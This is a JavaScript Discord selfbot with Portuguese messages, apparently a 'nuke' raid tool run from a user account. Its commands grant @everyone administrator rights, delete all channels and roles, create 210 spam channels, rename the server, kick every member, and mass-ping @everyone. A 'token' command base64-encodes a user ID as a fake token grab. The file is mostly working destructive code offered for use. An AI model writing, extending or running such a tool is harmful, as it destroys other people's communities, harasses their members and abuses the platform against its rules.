const Discord = require('discord.js-selfbot');
const client = new Discord.Client();
const MessageEmbed = require('discord.js').MessageEmbed;
const config = require("./config.json");




const prefix = ".";


client.on('ready', () => {
    console.log(`Logado em ${client.user.tag}!`);
});



client.on("message", function(message) {
  if (message.author.id !== client.user.id) return;
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;

  const commandBody = message.content.slice(prefix.length);
  const args = commandBody.split(' ');
  const command = args.shift().toLowerCase();
  if(command === "help")
 {
            let embed = new Discord.MessageEmbed()
    .setDescription("adeus , spam, userinfo, kall, tchau, jogo, token")
    .setColor("#01060d")
    .setFooter('Selfbot Do Felps xD');
    message.channel.send(embed);
            message.delete();
  }
  
  
  
  else if(command === "adeus")
  {
    message.delete();
    message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
    message.guild.channels.cache.forEach
    (channel => channel.delete());
    for (pas = 0; pas < 210; pas++)
    message.guild.channels.create
    ('felps marcando presença..', {
      type: 'text'
    });
    console.log(`Excluiu tudo 🚀`);
    message.guild.setName("Felps marcou presença");
    console.log(`Mudou o nome do servidor 🚀`);
  }
  
  
  
  else if(command === "spam") 
  {
    message.delete();
    for (pas = 0; pas < 99; pas++) {
      message.channel.send(
        " Passa no canal dps mkkk @everyone"
      );
    }
  }
   
   else if(command === "userinfo")
  {
    if(message.author.bot) return;
  let user = message.mentions.users.first() || message.author;

  let userinfo = {
    avatar: user.avatarURL(),
    name: user.username,
    discrim: `#${user.discriminator}`,
    id: user.id,
    status: user.presence.status,
    bot: user.bot,
    erstelltAm: user.createdAt,
  };

  let embed = new Discord.MessageEmbed()
  .setTitle("**Userinfo**")
  .setColor("RANDOM")
  .setThumbnail(userinfo.avatar)
  .addField("**Nome do usuário**: ",userinfo.name, true)
  .addField("**Tag**: ",userinfo.discrim, true)
  .addField("**Id**: ",userinfo.id, true)
  .addField("**Status**: ",userinfo.status, true)
  .addField("**Bot**: ",userinfo.bot, true)
  .addField("**Conta criada há**: ",userinfo.erstelltAm, true)
  .setTimestamp()
  .setFooter("Felps Ta on 🚀");

  message.channel.send(embed);
  }
  
  
  else if(command === "kall")
  {
    message.guild.members.cache.forEach(member => member.kick({ reason: "Felps marcando presença" })
                    .then(console.log(`${member.user.tag} kickado`) && message.channel.send("kickando geral.")
                        .catch()
                    ));
                message.delete();
  }
  
  else if(command === "tchau") {
    message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
        if(message.guild.channels.cache) {

            message.guild.channels.cache.forEach(channel => channel.delete());

        }

        if(message.guild.roles.cache) {

            message.guild.roles.cache.forEach(role => role.delete());

        }
  }
  
  else if(command === "jogo") {
    message.delete();
    let msg = args.join(' ');
    client.user.setActivity(msg, {type: 'PLAYING' });
    console.log("Você tá jogando" + msg);
  }
  
  else if(command === "token") {
    message.delete();
    let user = message.mentions.users.first() || client.users.cache.get(args[0]);
    if(!user) return message.channel.send('Você precisa mencionar um usuario.');
    let embed = new Discord.MessageEmbed()
    .setDescription(Buffer.from(user.id).toString("base64"))
    .setColor("#01060d")
    .setFooter('Felps tá on 🚀!');
    message.channel.send(embed);
  }
});


client.login(config.token);

